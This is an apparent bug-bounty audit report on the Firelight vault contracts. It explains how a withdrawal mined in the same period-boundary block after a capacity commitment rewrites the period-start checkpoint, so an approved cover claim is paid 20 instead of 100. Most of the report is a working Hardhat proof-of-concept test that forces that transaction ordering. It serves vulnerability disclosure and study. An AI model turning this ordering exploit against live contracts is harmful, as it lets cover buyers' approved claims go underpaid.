# 88473 sc high mutable period start checkpoint causes protocol insolvency by underpaying approved cover claims

**Submitted on Aug 13th 2026 at 11:04:53 UTC by @Aestheticccccc for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88473
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`CoverOrderAllocator` and `FirelightVault` both use `vault.totalAssetsAt(vault.currentPeriodStart())` as the collateral exposure for a period, however this value can change during the first block of that period when an allocation is committed first and a staker withdraws later in the same period-boundary block, the commitment is validated using the assets that existed before the withdrawal, thewithdrawal then records a lower checkpoint at the exact period-start timestamp, cover can still be settled using the larger capacity stored in the commitment, while a later incident payout reads the new, lower checkpoint and pays less than the approved claim values `100`, `80`, and `20` used below are an example scenario reproduced by the poc as well the vault starts with 100 assets, the commitment records capacity for 100, and a withdrawal of 80 leaves a period-start checkpoint of 20. Note - The issue is not limited to these values and scales with the amount withdrawn these values are just used for an example

## Vulnerability Details

root cause is that the protocol treats an inclusive timestamp checkpoint as an immutable period start snapshot, even though a transaction can still write a checkpoint with that timestamp after another transaction has already read it at the exact period boundary `T`, [`periodAtTimestamp` and `currentPeriodStart`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L316-L345) consider the new period active and return `T` as its start. The following sequence is then possible

* Before `T`, the vault contains 100 active assets. Cover orders have already been created for the next period.
* In the first block of the new period, `commitAllocation` executes first. [`_computeAvailableCapacity`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L689-L724) calls `totalAssetsAt(currentPeriodStart())`. Because no transaction has written a checkpoint at `T` yet, the lookup returns the latest earlier value, 100. The allocator accepts and stores a matching capacity of 100.
* A staker's public `withdraw(80, ...)` transaction executes later in the same block. [`withdraw`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L755-L775) records only 20 active assets at timestamp `T`, while [`_requestWithdraw`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1008-L1019) moves the other 80 into the delayed-withdrawal bucket
* [`Checkpoints.upperLookupRecent`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L218-L223) returns the latest checkpoint whose key is less than or equal to the requested timestamp. Therefore, later calls to `totalAssetsAt(T)` return 20, although the allocator previously committed 100 of capacity using the same period-start timestamp
* [`_settleCoverOrder`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L457-L539) relies on the stored commitment and does not recompute capacity. The full 100 units of cover can therefore be settled and represented by a real `CoverNFT`
* A valid incident assessment approves a loss of 100 against that settled cover. [`FirelightVault.payout`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L900-L927) sees 100 payable assets in total: 20 active assets plus 80 delayed-withdrawal assets. However, it also caps the payment by `totalAssetsAt(T)`, which now returns 20
* Only 20 is paid. [`approveCurrentAssessment`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L403-L438) then closes the incident, so the unpaid 80 is not recovered through a later payout this can occur naturally because cover orders target the next period, but `commitAllocation` can only be called once that period is current. an allocator bot is therefore expected to commit near the beginning of a period, a staker may already have a withdrawal pending at the boundary or may submit one for inclusion after the commitment,the allocator, curator, and assessment approver perform normal operations with valid data the only benefiting actor is an ordinary staker calling the public withdrawal function thus the required condition is that both transactions execute in the first new-period block at timestamp `T`, with the commitment before the withdrawal and flare documents an approximately 1.8-second block time and priority-gas-auction ordering, so this order is possible

## Impact Details

a valid cover claim can become undercollateralized after commitment and then be permanently underpaid. In the reproduced example

* 100 assets are present when capacity is committed
* 100 units of cover are settled and represented by a real `CoverNFT`
* A 100-unit loss is validated against that settled cover and approved
* The vault holds 20 active assets plus 80 delayed-withdrawal assets, all still slashable by the payout logic
* Only 20 is paid, the incident is closed, and the staker retains 64 pending withdrawal assets plus 16 active assets claim is underpaid by 80% in this example, and the shortfall scales with the amount withdrawn in the boundary block the protocol has sold and settled 100 units of cover but can satisfy only 20 units of the approved claim. this leaves its cover obligations greater than the amount the payout logic will release

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

to run this poc - create a file named `period_boundary_claim_underpayment.js`

* Paste only the JavaScript code below in that file
* run it using `npx hardhat test test/period_boundary_claim_underpayment.js`

```js

const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { deployVault } = require("./setup/fixtures.js");
const { expect } = require("chai");
const { ethers, network, upgrades } = require("hardhat");

const PERIOD_DURATION = 24 * 60 * 60;
const CANONICAL = 10n ** 18n;
const COVER_AMOUNT = 100n * CANONICAL;

async function deployIntegratedSystem() {
  const vaultCtx = await deployVault({
    decimals: 0n,
    initial_deposit_limit: 10_000n,
    period_configuration_duration: PERIOD_DURATION,
  });

  const signers = await ethers.getSigners();
  const curator = signers[9];
  const allocatorRole = signers[10];
  const configAdmin = signers[11];
  const buyer = signers[12];
  const premiumCollector = signers[13];
  const firstLossBuffer = signers[14];
  const assessmentApprover = signers[15];
  const assessmentRejecter = signers[16];
  const incidentInvalidator = signers[17];

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const premiumToken = await MockERC20.deploy("Mock USD", "mUSD", 18);

  const MockAggregator = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await MockAggregator.deploy(18, CANONICAL);

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ["Firelight Cover", "FLCOVER", "", vaultCtx.deployer.address, ethers.ZeroAddress, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: "transparent" },
  );

  const market = ethers.id("period-boundary-market");
  const protocol = "BoundaryCover";
  const chainId = 1;
  const marketId = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(["uint64", "string", "bytes32"], [chainId, protocol, market]),
  );

  const CoverOrderAllocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    CoverOrderAllocator,
    [{
      vault: vaultCtx.firelight_vault.target,
      premiumCollector: premiumCollector.address,
      coverNFT: coverNFT.target,
      priceFeedAdapter: priceFeed.target,
      maxPriceAge: PERIOD_DURATION * 2,
      premiumTokens: [premiumToken.target],
      admin: vaultCtx.deployer.address,
      adminRole: vaultCtx.deployer.address,
      curatorRole: curator.address,
      allocatorRole: allocatorRole.address,
      configAdminRole: configAdmin.address,
      initialProtocolConcentrations: [{
        protocol,
        chainId,
        maxProtocolConcentrationBps: 10_000,
      }],
      newMarkets: [{ chainId, protocol, market }],
      capacityConfig: {
        minCAR: 12_000,
        firstLossBufferToken: premiumToken.target,
        firstLossBuffer: firstLossBuffer.address,
        effectiveLeverage: 12_000,
        minOrderMarketCoverAmount: 1,
        divergenceToleranceBps: 0,
      },
    }],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await coverNFT.connect(vaultCtx.deployer).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  const IncidentManager = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      vaultCtx.deployer.address,
      curator.address,
      assessmentApprover.address,
      assessmentRejecter.address,
      incidentInvalidator.address,
      configAdmin.address,
      vaultCtx.deployer.address,
      vaultCtx.deployer.address,
      vaultCtx.payout_receiver.address,
      allocator.target,
      priceFeed.target,
      PERIOD_DURATION * 2,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await vaultCtx.firelight_vault
    .connect(vaultCtx.deployer)
    .grantRole(await vaultCtx.firelight_vault.PAYOUT_ROLE(), incidentManager.target);
  await vaultCtx.firelight_vault
    .connect(vaultCtx.deployer)
    .grantRole(await vaultCtx.firelight_vault.INCIDENT_ROLE(), incidentManager.target);

  return {
    ...vaultCtx,
    curator,
    allocatorRole,
    buyer,
    premiumToken,
    coverNFT,
    allocator,
    incidentManager,
    assessmentApprover,
    firstLossBuffer,
    marketId,
  };
}

describe("period-boundary claim payout", function () {
  it("settles cover against 100 assets but an exact-boundary withdrawal retroactively caps its approved payout at 20", async () => {
    const ctx = await loadFixture(deployIntegratedSystem);
    const staker = ctx.users[0];

    await ctx.utils.mintAndApprove(100n, staker);
    await ctx.firelight_vault.connect(staker).deposit(100n, staker.address);

    await ctx.premiumToken.mint(ctx.buyer.address, CANONICAL);
    await ctx.premiumToken.connect(ctx.buyer).approve(ctx.allocator.target, ethers.MaxUint256);

    await ctx.allocator.connect(ctx.curator).createCoverOrder(
      ctx.buyer.address,
      ctx.buyer.address,
      ctx.buyer.address,
      ctx.premiumToken.target,
      [{ marketId: ctx.marketId, coverRateAnnual: 500, coverAmount: COVER_AMOUNT }],
      0,
    );

    const allocation = [{ marketId: ctx.marketId, allocatedCover: COVER_AMOUNT }];
    const tree = StandardMerkleTree.of([[0n, [[ctx.marketId, COVER_AMOUNT]]]], ["uint256", "(bytes32,uint256)[]"]);
    const proof = tree.getProof(0);

    const boundary = await ctx.firelight_vault.currentPeriodEnd();
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(100n);

    // Both transactions are mined in one block at the exact period boundary. The
    // higher fee fixes their ordering: capacity is committed before the withdrawal.
    await time.setNextBlockTimestamp(boundary);
    await network.provider.send("evm_setAutomine", [false]);

    let commitTx;
    let withdrawTx;
    try {
      commitTx = await ctx.allocator.connect(ctx.allocatorRole).commitAllocation(
        1n,
        tree.root,
        COVER_AMOUNT,
        COVER_AMOUNT,
        { gasLimit: 3_000_000, gasPrice: ethers.parseUnits("100", "gwei") },
      );
      withdrawTx = await ctx.firelight_vault.connect(staker).withdraw(
        80n,
        staker.address,
        staker.address,
        { gasLimit: 1_000_000, gasPrice: ethers.parseUnits("10", "gwei") },
      );
      await network.provider.send("evm_mine");
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const commitReceipt = await commitTx.wait();
    const withdrawReceipt = await withdrawTx.wait();
    expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber);
    expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index);
    expect((await ethers.provider.getBlock(commitReceipt.blockNumber)).timestamp).to.equal(Number(boundary));

    const capturePeriod = await ctx.firelight_vault.currentPeriod();
    expect(capturePeriod).to.equal(1n);
    expect(await ctx.firelight_vault.currentPeriodStart()).to.equal(boundary);

    const commitment = await ctx.allocator.getAllocationCommitment(capturePeriod);
    expect(commitment.totalAvailableCapacity).to.equal(COVER_AMOUNT);
    expect(commitment.totalDeclaredAllocated).to.equal(COVER_AMOUNT);

    // The withdrawal rewrites the same timestamp that commitAllocation just used.
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(20n);
    expect(await ctx.firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(80n);
    expect(await ctx.firelight_vault.pendingWithdrawAssets()).to.equal(80n);
    expect(
      (await ctx.firelight_vault.totalAssets()) +
        (await ctx.firelight_vault.withdrawAssets(capturePeriod + 1n)),
    ).to.equal(100n);

    // Settlement trusts the stored commitment and does not revalidate the now-lower
    // period-start checkpoint, so the full 100 units of cover become live.
    await ctx.allocator.connect(ctx.allocatorRole).settleCoverOrder(0n, allocation, proof);
    const settledCommitment = await ctx.allocator.getAllocationCommitment(capturePeriod);
    expect(settledCommitment.totalSettledCover).to.equal(COVER_AMOUNT);
    expect(await ctx.coverNFT.ownerOf(0n)).to.equal(ctx.buyer.address);

    // A valid assessment for the fully settled cover executes the real payout
    // waterfall. With an empty first-loss buffer, all 100 must come from the vault.
    await ctx.incidentManager
      .connect(ctx.curator)
      .createIncident(boundary, "covered incident at period boundary", ethers.id("period-boundary-incident"));
    await ctx.incidentManager.connect(ctx.curator).confirmIncident(1n, "ipfs://period-boundary-assessment");
    await ctx.incidentManager
      .connect(ctx.curator)
      .addAssessmentLosses(1n, [{ coverTokenId: 0n, marketId: ctx.marketId, amount: COVER_AMOUNT }]);
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1n);

    await expect(ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1n))
      .to.emit(ctx.firelight_vault, "PayoutExecuted")
      .withArgs(ctx.payout_receiver.address, 100n, 20n, boundary)
      .and.to.emit(ctx.incidentManager, "IncidentPayoutExecuted")
      .withArgs(
        1n,
        1n,
        capturePeriod,
        capturePeriod,
        ctx.payout_receiver.address,
        ctx.firstLossBuffer.address,
        ctx.premiumToken.target,
        0n,
        COVER_AMOUNT,
        100n,
        20n,
      );

    const [incident] = await ctx.incidentManager.getIncident(1n);
    expect(incident.vaultPaidAmount).to.equal(20n);
    expect(incident.status).to.equal(4n); // CLOSED
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(20n);
    expect(await ctx.firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(64n);
    expect(await ctx.firelight_vault.pendingWithdrawAssets()).to.equal(64n);
  });
});
```
